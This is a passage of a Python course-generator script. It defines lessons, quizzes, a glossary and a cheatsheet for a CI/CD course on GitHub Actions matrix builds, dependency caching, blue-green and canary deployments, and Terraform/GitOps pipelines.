                "<ul><li><strong>1. The Matrix Dimension:</strong> Define arrays of variables under `strategy.matrix`: language versions, database engines, or operating systems.</li><li><strong>2. Combinatorial Expansion:</strong> GitHub Actions automatically multiplies the dimensions: 3 Python versions $\\times$ 2 OS runners = <strong>6 parallel jobs spawned instantly!</strong></li><li><strong>3. Fail-Fast Control (`fail-fast: false`):</strong> By default, if Job #1 fails, GitHub cancels all other matrix jobs. Setting `fail-fast: false` allows all jobs to complete so you can see the complete compatibility scorecard!</li><li><strong>4. Inclusions and Exclusions:</strong> Customize specific matrix permutations using `include` and `exclude` keys.</li></ul>",
                "<pre><code># Multi-Version Cross-OS Matrix Workflow:\njobs:\n  compatibility-matrix:\n    name: Test (Python ${{ matrix.python-version }} on ${{ matrix.os }})\n    runs-on: ${{ matrix.os }}\n    strategy:\n      fail-fast: false # Let all combinations finish!\n      matrix:\n        os: [ubuntu-latest, macos-latest, windows-latest]\n        python-version: [\"3.10\", \"3.11\", \"3.12\"]\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python-version }}\n      - run: pip install -r requirements.txt && pytest</code></pre>",
                "<div class=\"callout\"><p><strong>The Matrix Power:</strong> A 10-line matrix block tests your application across 9 independent platform permutations concurrently in under 2 minutes.</p></div>"
            ],
            "Combinatorial Matrix Expansion", "Automating multi-environment test grids",
            [
                {"title": "Matrix Definition", "lines": ["os: [ubuntu, macos, windows]", "python: [3.10, 3.11, 3.12]"]},
                {"title": "Automated Job Expansion (9 Parallel Runners!)", "lines": ["Job 1: Ubuntu + 3.10 | Job 2: Ubuntu + 3.11 | Job 3: Ubuntu + 3.12", "Job 4: macOS + 3.10  | Job 5: macOS + 3.11  | Job 6: macOS + 3.12", "Job 7: Windows + 3.10| Job 8: Windows + 3.11| Job 9: Windows + 3.12"]}
            ],
            "Fail-Fast Strategy", "Controlling matrix execution on error",
            [
                {"title": "fail-fast: true (Default)", "lines": ["One job fails -> Cancels remaining 8 jobs immediately"]},
                {"title": "fail-fast: false (Diagnostic)", "lines": ["All 9 jobs run to completion", "Produces full multi-platform compatibility report"]}
            ],
            "Complete the matrix builds sentence",
            "GitHub Actions matrix strategies spawn parallel jobs across combinations of operating systems and runtime versions, using {1} controls to collect full {2} scorecards.",
            [
                {"answer": "fail-fast", "hint": "Option controlling whether to abort sibling jobs on failure", "options": ["fail-fast", "formatting", "licensing"]},
                {"answer": "compatibility", "hint": "Multi-platform verification results", "options": ["compatibility", "hardware", "monitors"]}
            ],
            [
                {"q": "How many total parallel jobs will be spawned by a matrix defining 'os: [ubuntu, windows]' and 'node: [18, 20, 22]'?",
                 "a": ["6 jobs (2 operating systems x 3 Node versions)", "5 jobs", "1 job", "18 jobs"],
                 "c": 0, "why": "Matrix configurations compute the Cartesian product of all defined variable dimensions (2 x 3 = 6)."},
                {"q": "What happens when 'fail-fast: false' is configured in a matrix strategy?",
                 "a": ["If one permutation fails (e.g. Python 3.10 on Windows), the other matrix jobs continue running to completion rather than being cancelled", "The build runs twice as fast", "The pipeline ignores all failures", "The build never times out"],
                 "c": 0, "why": "fail-fast: false ensures all matrix permutations run to completion for diagnostic visibility."},
                {"q": "Why is testing across multiple operating systems critical for CLI utilities or file-processing libraries?",
                 "a": ["Different operating systems handle file path separators (\\ vs /), line endings (CRLF vs LF), and permissions differently", "Windows runs Python in French", "macOS does not have terminals", "Linux cannot read files"],
                 "c": 0, "why": "Path separators, line endings, and OS-specific syscalls frequently cause cross-platform defects."},
                {"q": "How does GitHub Actions charge compute minutes for macOS runners compared to standard Linux runners?",
                 "a": ["macOS runners consume 10x more billing minutes per minute of execution compared to Linux runners", "macOS runners are free", "Both cost exactly the same", "Linux costs 10x more than macOS"],
                 "c": 0, "why": "macOS runners carry a 10x multiplier on GitHub Actions billing due to specialized Apple hardware costs."}
            ],
            "You know how to scale testing coverage using GitHub Actions matrix strategies and cross-platform runners.",
            "Artifacts, Dependency Caching, and Pipeline Acceleration", "Slash CI build times from 10 minutes to 45 seconds using caching."
        ),
        build_lesson(
            5, "artifacts-dependency-caching-acceleration", "Artifacts, Dependency Caching, and Pipeline Acceleration", "Pipeline Acceleration",
            "Optimizing CI performance: caching package dependencies (`actions/cache`), sharing build artifacts (`actions/upload-artifact`), and sub-minute builds.",
            "Why is dependency caching (`actions/cache`) essential for fast CI/CD pipelines?",
            ["It avoids re-downloading and recompiling hundreds of megabytes of third-party packages on every commit, shrinking CI runtime from minutes to seconds", "It makes code run without electricity", "It deletes old test files", "It is required by git"],
            0, "Dependency caching reuses previously downloaded packages based on lockfile checksums, bypassing network downloads.",
            [
                "<p>A pipeline that takes 12 minutes to run destroys developer velocity: engineers get distracted, open Twitter, and lose their train of thought. A world-class CI pipeline should finish in <strong>under 60 seconds</strong>. The secret to sub-minute pipelines is <strong>Aggressive Caching and Artifact Sharing</strong>.</p>",
                "<p>Two Acceleration Techniques in GitHub Actions:</p>",
                "<ul><li><strong>1. Dependency Caching (`actions/setup-python` / `actions/cache`):</strong> Hash your lockfile (`hashFiles('**/requirements.txt')` or `poetry.lock`). If the lockfile has not changed, GitHub Actions restores the cached `~/.cache/pip` directory in <strong>2 seconds</strong> instead of downloading packages from the internet!</li><li><strong>2. Passing Build Artifacts (`actions/upload-artifact`):</strong> A workflow might have two jobs: Job A (Build frontend bundle `dist/`) and Job B (Deploy to CDN). Instead of re-building the frontend in Job B, Job A uploads the `dist/` folder as an artifact, and Job B downloads it in 1 second!</li><li><strong>3. Concurrency Cancellation:</strong> If an engineer pushes 3 rapid commits to the same PR, cancel older running builds automatically: <code>concurrency: { group: pr-${{ github.ref }}, cancel-in-progress: true }</code>!</li></ul>",
                "<pre><code># Fast Dependency Caching & Concurrency Cancellation:\nconcurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true # Cancels redundant outdated builds!\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup Python with Built-In Pip Cache\n        uses: actions/setup-python@v5\n        with:\n          python-version: \"3.12\"\n          cache: \"pip\" # Automatically caches ~/.cache/pip based on requirements.txt!\n      - run: pip install -r requirements.txt # Restored from cache in 1.8 seconds!</code></pre>",
                "<div class=\"callout\"><p><strong>The Cancel-In-Progress Rule:</strong> Always enable <code>cancel-in-progress: true</code> on pull request workflows. It saves 40% of your company's monthly CI compute bill by terminating obsolete runs.</p></div>"
            ],
            "Uncached vs Cached CI Execution", "10-minute bottleneck vs 45-second feedback loop",
            [
                {"title": "Uncached Pipeline (Slow: 8m 30s)", "lines": ["Clones repo -> Downloads 200MB wheels over internet", "Compiles C-extensions -> Wastes 7 minutes every commit"]},
                {"title": "Cached Pipeline (Blazing: 48s)", "lines": ["Restores cached wheels from GitHub storage (2s)", "Executes tests immediately -> Instant feedback!"]}
            ],
            "Sharing Build Artifacts Across Jobs", "Build once, deploy everywhere",
            [
                {"title": "Job 1: Build Application", "lines": ["Compiles React bundle -> upload-artifact 'dist'"]},
                {"title": "Job 2: Deploy to Cloud", "lines": ["download-artifact 'dist' -> Deploys in 5 seconds!"]}
            ],
            "Complete the pipeline acceleration sentence",
            "Pipeline acceleration restores third-party packages from cache based on {1} hashes and uses cancel-in-progress to terminate {2} builds.",
            [
                {"answer": "lockfile", "hint": "File containing exact pinned dependency checksums", "options": ["lockfile", "formatting", "licensing"]},
                {"answer": "redundant", "hint": "Obsolete out-of-date runs", "options": ["redundant", "compiled", "encrypted"]}
            ],
            [
                {"q": "How does 'cache-key: ${{ hashFiles('requirements.txt') }}' determine when to invalidate a dependency cache?",
                 "a": ["If requirements.txt changes, its SHA-256 hash changes, resulting in a cache miss that triggers a clean re-download of dependencies", "It checks the date on the file", "It asks the developer", "It deletes the repository"],
                 "c": 0, "why": "HashFiles computes a cryptographic digest of the file; any edit produces a new cache key."},
                {"q": "What is the purpose of 'cancel-in-progress: true' in workflow concurrency settings?",
                 "a": ["It automatically cancels older, in-flight runs of the same workflow branch when a newer commit is pushed, saving compute minutes", "It cancels the entire git repository", "It deletes the pull request", "It turns off the developer's laptop"],
                 "c": 0, "why": "Cancel-in-progress aborts obsolete intermediate builds, freeing runners for the latest commit."},
                {"q": "What action is used to pass compiled binary or web bundles between separate jobs in GitHub Actions?",
                 "a": ["actions/upload-artifact and actions/download-artifact", "actions/send-email", "actions/save-cookie", "actions/print"],
                 "c": 0, "why": "The upload/download artifact actions persist and retrieve files across independent job environments."},
                {"q": "Where does GitHub Actions store cached dependencies?",
                 "a": ["In GitHub-managed cloud cache storage, retained for up to 7 days per repository branch", "On the developer's desktop", "In the user's browser cache", "On a floppy disk"],
                 "c": 0, "why": "GitHub maintains a cloud cache storage tier scoped to repository branches with a 7-day retention window."}
            ],
            "You know how to accelerate CI/CD pipelines using dependency caching, artifacts, and concurrency cancellation.",
            "CD Strategies: Blue-Green Deployments and Canary Releases", "Ship software to production with zero downtime and instant rollback."
        ),
        build_lesson(
            6, "cd-strategies-blue-green-canary", "CD Strategies: Blue-Green Deployments and Canary Releases", "Deployment Strategies",
            "Eliminating deployment downtime: Rolling Updates, Blue-Green Deployments (instant traffic cutover), and Canary Releases (gradual exposure).",
            "What is a 'Blue-Green Deployment' in continuous delivery architecture?",
            ["Running two identical production environments (Blue and Green); deploying the new version to Green, testing it, and switching router traffic instantly", "Painting the servers blue and green", "Deploying software on Earth Day", "A type of color-blindness test"],
            0, "Blue-Green deployments maintain two identical environments, enabling instant cutover and zero-downtime rollbacks.",
            [
                "<p>In the early days of the web, deploying meant stopping the server, replacing the binary, and starting it again. Users saw a <code>502 Bad Gateway</code> maintenance screen for 3 minutes. In modern cloud engineering, <strong>deployment downtime is unacceptable</strong>.</p>",
                "<p>The Three Modern Production Deployment Strategies:</p>",
                "<ul><li><strong>1. Rolling Updates (Standard Kubernetes / ECS):</strong> Incrementally replaces old container pods with new ones one by one. Traffic is routed only to pods whose healthchecks have passed. Zero downtime, but old and new versions run concurrently for a few minutes.</li><li><strong>2. Blue-Green Deployments (Instant Atomic Cutover):</strong><ul><li><em>Blue (Active):</em> Currently serving 100% of live production traffic.</li><li><em>Green (Idle):</em> Deploy the new version here. Run end-to-end smoke tests against Green in isolation.</li><li><em>The Cutover:</em> Flip the load balancer / CDN router from Blue to Green in <strong>under 1 second</strong>! If an issue arises, flip back to Blue instantly!</li></ul></li><li><strong>3. Canary Releases (Risk-Bounded Rollout):</strong> Route 1% of live traffic to the new version (the Canary). If error rates remain flat for 15 minutes, increase to 10%, 50%, and finally 100%.</li></ul>",
                "<pre><code># Blue-Green Router Traffic Cutover (NGINX / Cloudflare): \n# Step 1: Green environment verified healthy via smoke tests.\n# Step 2: Update upstream pointer and reload router:\nupstream production_backend {\n    # server blue-app.internal:8000; # PREVIOUS ACTIVE (Standby for rollback)\n    server green-app.internal:8000;  # NEW ACTIVE (Instant 1-second cutover!)\n}</code></pre>",
                "<div class=\"callout\"><p><strong>The Database Migration Caveat:</strong> In Blue-Green and Rolling deployments, old and new code run at the same time. Database migrations must always be backwards-compatible (expand before contract)!</p></div>"
            ],
            "The Three Deployment Strategies", "Rolling vs Blue-Green vs Canary",
            [
                {"title": "Rolling Update", "lines": ["Pod 1 -> Pod 2 -> Pod 3 updated incrementally", "Standard K8s default, zero downtime", "Old & new versions run simultaneously"]},
                {"title": "Blue-Green Cutover", "lines": ["Two identical environments (Blue & Green)", "Instant 1-second router traffic switch", "Instant one-click rollback if bugs occur!"]},
                {"title": "Canary Rollout", "lines": ["1% -> 10% -> 50% -> 100% gradual traffic", "Limits blast radius of bugs to tiny audience", "Automated rollback on error rate spikes"]}
            ],
            "Database Backward Compatibility", "The Expand-and-Contract migration pattern",
            [
                {"title": "Step 1: Expand", "lines": ["Add new nullable column, both Blue and Green work"]},
                {"title": "Step 2: Deploy", "lines": ["Switch traffic to Green"]},
                {"title": "Step 3: Contract", "lines": ["Remove old column after Blue is decommissioned"]}
            ],
            "Complete the deployment strategies sentence",
            "Blue-Green deployments eliminate downtime by switching load balancer traffic between identical environments, while {1} releases gradually route small traffic percentages to limit {2} radius.",
            [
                {"answer": "canary", "hint": "Gradual percentage traffic rollout", "options": ["canary", "formatting", "licensing"]},
                {"answer": "blast", "hint": "Scope of potential failure impact", "options": ["blast", "hardware", "monitors"]}
            ],
            [
                {"q": "What is the primary advantage of a Blue-Green deployment over a standard rolling update?",
                 "a": ["Instantaneous atomic cutover and instantaneous rollback: if a defect is found, traffic can be redirected back to the old environment in one second", "Blue-Green uses half the servers", "Blue-Green requires no load balancer", "Blue-Green is free of charge"],
                 "c": 0, "why": "Flipping load balancer pointers enables instantaneous rollback to the warm standby environment."},
                {"q": "Why must database migrations be backwards-compatible during Rolling and Blue-Green deployments?",
                 "a": ["Both the old version and new version of the application run concurrently against the same database during the transition period", "Databases cannot run migrations", "Old code deletes new tables", "Migrations only run on Linux"],
                 "c": 0, "why": "Concurrent version execution requires schemas that satisfy both old and new code contracts simultaneously."},
                {"q": "What is the 'Expand and Contract' pattern in database schema migrations?",
                 "a": ["A multi-step migration practice where new columns/tables are added first without breaking old code, and deprecated fields are deleted only after rollout completes", "Compressing database files", "Expanding hard drive partitions", "A technique for shrinking RAM"],
                 "c": 0, "why": "Expand and contract decouples database schema evolution from application code rollouts."},
                {"q": "How does an automated Canary deployment decide when to roll back?",
                 "a": ["By continuously comparing Prometheus/Datadog error rates, HTTP 500s, and latency between the canary and control pools", "By checking user tweets", "By waiting 3 weeks", "By asking the developer"],
                 "c": 0, "why": "Automated canaries monitor telemetry deltas, triggering rollbacks if canary error rates exceed thresholds."}
            ],
            "You know how to design and execute Rolling Updates, Blue-Green cutovers, and Canary releases.",
            "Infrastructure as Code (IaC) and GitOps Principles", "Declare and manage infrastructure and deployment states through Git."
        ),
        build_lesson(
            7, "infrastructure-as-code-iac-gitops", "Infrastructure as Code (IaC) and GitOps Principles", "IaC & GitOps",
            "Automated infrastructure: Terraform / OpenTofu (declarative cloud provisioning), GitOps principles (ArgoCD, Flux), and reconciliation loops.",
            "What is 'Infrastructure as Code' (IaC) and why has it replaced manual cloud console clicking?",
            ["Defining and provisioning cloud infrastructure (VPCs, databases, clusters) using declarative, version-controlled code files rather than manual console clicks", "Writing code in Microsoft Word", "Building physical servers by hand", "A technique for speeding up Wi-Fi"],
            0, "IaC replaces error-prone manual cloud console clicking with declarative, version-controlled, reproducible code.",
            [
                "<p>Configuring cloud infrastructure by clicking buttons in the AWS or Azure web console is an anti-pattern known as <strong>'ClickOps'</strong>. ClickOps is non-reproducible, lacks change history, and makes disaster recovery impossible: if your AWS region is destroyed, nobody remembers which 40 checkboxes were clicked in the console.</p>",
                "<p>The Paradigm of <strong>Infrastructure as Code (Terraform / OpenTofu)</strong>:</p>",
                "<ul><li><strong>1. Declarative State:</strong> You write code describing the <em>desired state</em>: <code>resource \"aws_s3_bucket\" \"invoices\" { bucket = \"company-invoices-prod\" }</code>. Terraform computes the mathematical diff (`terraform plan`) and creates it (`terraform apply`).</li><li><strong>2. Version-Controlled Cloud:</strong> Your entire infrastructure lives in a Git repository. Adding an S3 bucket or scaling a database is done via a Pull Request with peer review!</li><li><strong>3. What is GitOps (ArgoCD / Flux)?</strong> Git is the single source of truth for <strong>both infrastructure and application state</strong>. An in-cluster operator (ArgoCD) continuously monitors the Git repository. When a commit changes the image tag, ArgoCD automatically syncs and deploys the change to Kubernetes!</li><li><strong>4. Automated Reconciliation:</strong> If someone manually modifies a production container, the GitOps operator detects the drift and <strong>automatically reverts it back to match Git</strong>!</li></ul>",
                "<pre><code># Declarative Infrastructure with Terraform (HCL):\nresource \"aws_security_group\" \"api_ingress\" {\n  name        = \"api-production-sg\"\n  description = \"Allow HTTPS inbound traffic\"\n\n  ingress {\n    from_port   = 443\n    to_port     = 443\n    protocol    = \"tcp\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}\n# Executing `terraform apply` provisions the exact security group reproducibly in any region!</code></pre>",
                "<div class=\"callout\"><p><strong>The GitOps Law:</strong> If it isn't in Git, it doesn't exist. Never modify production systems manually. Change the code in Git, and let automated CI/CD and GitOps sync the world.</p></div>"
            ],
            "ClickOps vs Infrastructure as Code", "Manual console clicking vs declarative versioned code",
            [
                {"title": "ClickOps (Fragile Anti-Pattern)", "lines": ["Clicking buttons in AWS web console", "Zero audit trail of who changed what", "Disaster recovery is impossible to replicate"]},
                {"title": "Infrastructure as Code (Terraform)", "lines": ["Declarative HCL checked into Git", "Peer-reviewed Pull Requests for infra changes", "100% reproducible in any cloud region!"]}
            ],
            "The GitOps Reconciliation Loop", "Continuous desired-state enforcement",
            [
                {"title": "Git Repository (Desired State)", "lines": ["image: company/api:v1.4"]},
                {"title": "ArgoCD In-Cluster Operator", "lines": ["Continuously diffs Git vs Kubernetes", "Drift detected? Automatically reconciles!"]}
            ],
            "Complete the IaC sentence",
            "Infrastructure as Code defines cloud resources declaratively in version-controlled repositories, while GitOps operators continuously reconcile production to match {1} as the single source of {2}.",
            [
                {"answer": "Git", "hint": "Distributed version control system", "options": ["Git", "HTML", "Excel"]},
                {"answer": "truth", "hint": "Authoritative state baseline", "options": ["truth", "formatting", "licensing"]}
            ],
            [
                {"q": "What problem does 'ClickOps' (manually creating cloud resources in web consoles) cause for engineering teams?",
                 "a": ["Configuration drift, lack of audit trails, inability to replicate environments, and high human error during disaster recovery", "It makes cloud bills cheaper", "It speeds up computers", "It deletes source code"],
                 "c": 0, "why": "Manual configuration lacks auditability and cannot be reliably reproduced or automated."},
                {"q": "What does 'terraform plan' do before applying infrastructure changes?",
                 "a": ["It computes the execution diff between current cloud infrastructure and desired code, showing exactly what resources will be created, modified, or destroyed", "It applies the changes immediately", "It shuts down the cloud", "It reboots the servers"],
                 "c": 0, "why": "terraform plan previews all proposed modifications before making real-world cloud mutations."},
                {"q": "What is 'Configuration Drift' in cloud infrastructure?",
                 "a": ["When the real-world state of a cloud resource diverges from the code defined in Git (e.g. someone manually edited a security group in the console)", "Computers drifting on a desk", "A bug in the mouse driver", "A slow network connection"],
                 "c": 0, "why": "Configuration drift occurs when manual out-of-band changes alter resources outside version control."},
                {"q": "How does an automated GitOps operator (like ArgoCD) react when manual configuration drift occurs in a Kubernetes cluster?",
                 "a": ["It detects the discrepancy between Git and the live cluster, automatically reverting the unauthorized change to match the Git repository", "It crashes the cluster", "It sends an angry email", "It shuts down GitHub"],
                 "c": 0, "why": "GitOps continuously enforces the Git repository as the authoritative desired state, overwriting drift."}
            ],
            "You know how to define cloud infrastructure using IaC and implement GitOps reconciliation workflows.",
            "Building an End-to-End Automated CI/CD Pipeline", "Synthesize everything: build a complete, production-grade CI/CD pipeline."
        ),
        build_lesson(
            8, "building-automated-cicd-pipeline", "Building an End-to-End Automated CI/CD Pipeline", "CI/CD Pipeline",
            "Synthesizing deployment: building a complete GitHub Actions pipeline from commit to test, security scan, container build, and deployment.",
            "What complete sequence of automated gates defines a production-grade Continuous Delivery pipeline?",
            ["Linting, static typing, automated unit tests, container build, Trivy security scan, and automated deployment with rollback gates", "Typing code and uploading via FTP", "Saving files to a USB drive", "Running tests only on holidays"],
            0, "A production CI/CD pipeline automates verification, security scanning, container packaging, and zero-downtime deployment.",
            [
                "<p>We have covered the complete engineering discipline of CI/CD & Automated Deployment: continuous delivery philosophy, GitHub Actions workflows, automated quality gates, matrix testing, dependency caching, Blue-Green deployments, and GitOps IaC.</p>",
                "<p>Now, we synthesize these into a <strong>Complete Production-Grade CI/CD Pipeline</strong>:</p>",
                "<ul><li><strong>Stage 1 (Code Quality Gate - 30s):</strong> Runs Ruff linter and Pyright static type checker concurrently.</li><li><strong>Stage 2 (Automated Test Suite - 45s):</strong> Restores cached pip dependencies; runs pytest with an 85% coverage threshold gate.</li><li><strong>Stage 3 (Security & Container Build - 40s):</strong> Builds a hardened multi-stage Docker image tagged with git commit SHA; scans image with Trivy for Critical CVEs.</li><li><strong>Stage 4 (Deploy to Staging):</strong> Deploys container image to staging Kubernetes cluster; executes automated end-to-end integration tests.</li><li><strong>Stage 5 (Production Release):</strong> On merge to `main`, executes zero-downtime deployment with automated rollback on error rate spikes!</li></ul>",
                "<pre><code># The Complete Master CI/CD Pipeline (.github/workflows/deploy.yml):\nname: Production Release Pipeline\non:\n  push:\n    branches: [main]\n\njobs:\n  verify:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-python@v5\n        with: { python-version: \"3.12\", cache: \"pip\" }\n      - run: pip install -r requirements.txt\n      - run: ruff check . && pyright src/ && pytest --cov=src\n\n  build-and-deploy:\n    needs: [verify] # Only runs if verification succeeds!\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Build & Scan Docker Image\n        run: |\n          docker build -t company/api:${{ github.sha }} .\n          trivy image --exit-code 1 --severity CRITICAL company/api:${{ github.sha }}\n      - name: Deploy to Cloud (Keyless OIDC!)\n        uses: aws-actions/configure-aws-credentials@v4\n        with: { role-to-assume: \"arn:aws:iam::123:role/DeployerRole\", aws-region: \"us-east-1\" }\n      - run: aws ecs update-service --cluster prod --service api --force-new-deployment</code></pre>",
                "<div class=\"callout\"><p><strong>The Final Engineering Victory:</strong> Every commit is tested, scanned, containerized, and deployed automatically. You have built a software delivery machine that turns ideas into production reality with mathematical safety.</p></div>"
            ],
            "The End-to-End Delivery Pipeline", "From git commit to verified production deployment",
            [
                {"title": "1. Verify Gate (30s)", "lines": ["Ruff Linter + Pyright Types + Pytest Suite", "Must pass 100% to proceed"]},
                {"title": "2. Security & Build (40s)", "lines": ["Multi-stage Docker build with Git SHA tag", "Trivy scans for Critical vulnerabilities"]},
                {"title": "3. Keyless Cloud Deploy", "lines": ["OIDC authentication to AWS / K8s", "Zero static secrets in GitHub"]},
                {"title": "4. Rolling Zero Downtime", "lines": ["Traffic shifts to healthy new containers", "Automated instant rollback if errors occur!"]}
            ],
            "Developer Workflow Velocity", "Commit -> Production in 2 minutes",
            [
                {"title": "Developer Workflow", "lines": ["git commit -> git push -> Grab a coffee", "Code is verified, scanned, and live in 2 minutes!"]}
            ],
            "Complete the CI/CD pipeline sentence",
            "An end-to-end continuous delivery pipeline verifies code quality with automated test gates, scans container images for vulnerabilities, and executes keyless zero-downtime {1} to {2}.",
            [
                {"answer": "deployments", "hint": "Releasing software to servers", "options": ["deployments", "formatting", "licensing"]},
                {"answer": "production", "hint": "Live customer environment", "options": ["production", "hardware", "monitors"]}
            ],
            [
                {"q": "What happens if a developer's code passes linting and unit tests, but the Docker image contains a newly announced Critical security CVE?",
                 "a": ["The Trivy security scanning step fails with exit code 1, halting the pipeline and preventing vulnerable code from deploying to production", "The image deploys anyway", "The pipeline reboots the computer", "The CVE is ignored"],
                 "c": 0, "why": "Automated security gates prevent images containing critical vulnerabilities from reaching production."},
                {"q": "Why is deploying code to a staging environment and running integration tests before production deployment valuable?",
                 "a": ["It validates that the application functions correctly against real databases, cloud networks, and external APIs in an environment identical to production", "Staging servers are free", "It eliminates the need for unit tests", "Staging is required by git"],
                 "c": 0, "why": "Staging testing catches environmental, database, and integration defects before customer exposure."},
                {"q": "What is the primary benefit of using keyless OIDC authentication in GitHub Actions deployment steps?",
                 "a": ["Zero permanent cloud access keys are stored in GitHub Secrets, eliminating credential leak risks if repository settings are breached", "It speeds up deployment times by 10x", "It compiles Python to assembly", "It makes cloud storage free"],
                 "c": 0, "why": "OIDC eliminates static cloud credentials entirely, drastically improving security posture."},
                {"q": "What is the ultimate mark of an expert DevOps and Continuous Delivery engineer?",
                 "a": ["Building fully automated, self-defending pipelines that test, scan, package, and deploy software reliably multiple times a day with zero downtime", "Deploying code manually via SSH at 2 AM", "Refusing to write automated tests", "Writing code directly on production servers"],
                 "c": 0, "why": "Automating safe, reliable, and repeatable continuous delivery defines elite DevOps engineering."}
            ],
            "You have completed the CI/CD & Automated Deployment course.",
            "Next Course: Cloud Architecture", "Explore the mental model of cloud infrastructure: VPCs, subnets, compute paradigms, cloud storage, and global traffic management."
        )
    ]

    glossary = [
        {"id": "cd-foundations", "title": "Continuous Delivery & Actions", "terms": [
            {"term": "Continuous Delivery", "def": "A software engineering discipline where code changes are automatically prepared and safely released to production.", "lesson": 1, "tags": ["cicd", "devops"]},
            {"term": "Trunk-Based Development", "def": "A branching practice where developers merge short-lived branches into main daily to prevent merge conflicts.", "lesson": 1, "tags": ["git", "branching"]},
            {"term": "GitHub Actions", "def": "A cloud-native CI/CD automation platform orchestrating workflows, jobs, and steps triggered by repository events.", "lesson": 2, "tags": ["tools", "actions"]}
        ]},
        {"id": "gates-testing", "title": "Gates & Matrix", "terms": [
            {"term": "Quality Gate", "def": "A mandatory automated check (lint, type, test, scan) that must pass before code can be merged or deployed.", "lesson": 3, "tags": ["quality", "gates"]},
            {"term": "Branch Protection Rule", "def": "Repository configuration blocking pull request merges until designated status checks pass and approvals are granted.", "lesson": 3, "tags": ["github", "governance"]},
            {"term": "Matrix Build", "def": "A strategy duplicating a job across combinations of language versions and operating systems in parallel.", "lesson": 4, "tags": ["testing", "matrix"]}
        ]},
        {"id": "optimization-deploy", "title": "Optimization & Deployments", "terms": [
            {"term": "Dependency Caching", "def": "Reusing downloaded package caches based on lockfile hashes to slash pipeline duration from minutes to seconds.", "lesson": 5, "tags": ["performance", "caching"]},
            {"term": "Blue-Green Deployment", "def": "Running two identical environments (Blue and Green) and switching router traffic instantly for zero-downtime rollouts.", "lesson": 6, "tags": ["deploy", "bluegreen"]},
            {"term": "Canary Release", "def": "Incrementally routing a tiny percentage of live traffic to a new version to bound the blast radius of unexpected defects.", "lesson": 6, "tags": ["deploy", "canary"]}
        ]},
        {"id": "iac-gitops", "title": "IaC & GitOps", "terms": [
            {"term": "Infrastructure as Code", "def": "Provisioning and managing cloud infrastructure using declarative, version-controlled code files (Terraform).", "lesson": 7, "tags": ["iac", "terraform"]},
            {"term": "GitOps", "def": "A methodology using Git as the single source of truth for infrastructure, with operators (ArgoCD) enforcing state.", "lesson": 7, "tags": ["gitops", "argocd"]},
            {"term": "Configuration Drift", "def": "When live cloud infrastructure diverges from the declarative code definitions in version control.", "lesson": 7, "tags": ["drift", "cloud"]}
        ]}
    ]

    cheatsheet = [
        {
            "title": "Complete GitHub Actions CI Workflow",
            "label": "Linting, typing, and testing pipeline",
            "code": "name: CI\non: [pull_request]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-python@v5\n        with: { python-version: \"3.12\", cache: \"pip\" }\n      - run: pip install -r requirements.txt\n      - run: ruff check . && pyright src/ && pytest",
            "lessonN": 2, "lessonSlug": "github-actions-core-concepts", "lessonTitle": "GitHub Actions Core Concepts: Workflows, Jobs, and Steps"
        },
        {
            "title": "Concurrency Cancel-in-Progress Configuration",
            "label": "Terminating obsolete PR runs",
            "code": "concurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true",
            "lessonN": 5, "lessonSlug": "artifacts-dependency-caching-acceleration", "lessonTitle": "Artifacts, Dependency Caching, and Pipeline Acceleration"
        },
        {
            "title": "Cross-Platform Matrix Test Configuration",
            "label": "Multi-OS and multi-version grid",
            "code": "strategy:\n  fail-fast: false\n  matrix:\n    os: [ubuntu-latest, macos-latest, windows-latest]\n    python: [\"3.11\", \"3.12\"]\nruns-on: ${{ matrix.os }}\nsteps:\n  - uses: actions/setup-python@v5\n    with: { python-version: ${{ matrix.python }} }",
            "lessonN": 4, "lessonSlug": "matrix-builds-cross-platform-testing", "lessonTitle": "Matrix Builds and Cross-Platform Testing"
        },
        {
            "title": "Trivy Security Scanning in GitHub Actions",
            "label": "Failing CI on Critical vulnerabilities",
            "code": "- name: Scan Docker Image for Vulnerabilities\n  uses: aquasecurity/trivy-action@master\n  with:\n    image-ref: 'company/api:${{ github.sha }}'\n    exit-code: '1'\n    severity: 'CRITICAL,HIGH'",
            "lessonN": 8, "lessonSlug": "building-automated-cicd-pipeline", "lessonTitle": "Building an End-to-End Automated CI/CD Pipeline"
        }
    ]

    course_data = {
        "id": "ci-cd",
        "title": "CI/CD & Automated Deployment",
        "num": 97,
        "emoji": "🔁",
        "desc": "Automate build, test and deploy so every change ships safely and repeatably.",
        "topics": ["CI/CD", "Continuous Delivery", "GitHub Actions", "Quality Gates", "Matrix Builds", "Dependency Caching", "Blue-Green Deployment", "Canary Releases", "IaC", "GitOps"],
        "mission": "# Mission — CI/CD & Automated Deployment\n\nMaster the engineering discipline of Continuous Integration and Continuous Delivery (CI/CD). Embrace small-batch continuous delivery and DORA metrics, author declarative GitHub Actions workflows across jobs and steps, enforce automated quality gates with linters, static typing, and branch protection rules, scale testing across operating systems with matrix builds, slash pipeline runtimes with dependency caching and artifact sharing, deploy with zero downtime using Blue-Green and Canary releases, manage infrastructure declaratively with IaC and GitOps, and build automated production deployment pipelines.",
        "notes": "# Notes — CI/CD & Automated Deployment\n\nDeploy small, frequent batches. A green build is the minimum entry price for production. Automate linting, typing, unit testing, and security scanning on every pull request.",
        "resources": "# Resources — CI/CD & Automated Deployment\n\n- Jez Humble & David Farley, *Continuous Delivery: Reliable Software Releases through Build, Test, and Deployment Automation*\n- Nicole Forsgren, Jez Humble, Gene Kim, *Accelerate: The Science of Lean Software and DevOps (DORA)*\n- GitHub Actions Documentation, *Workflow Syntax and Best Practices Reference*",
        "glossaryGroups": glossary,
        "cheatsheetSections": cheatsheet,
        "lessons": lessons
    }
    save_course(course_data)

# ==============================================================================
# COURSE 98: cloud-architecture (Cloud Architecture)
# ==============================================================================
def make_course_98():
    lessons = [
        build_lesson(
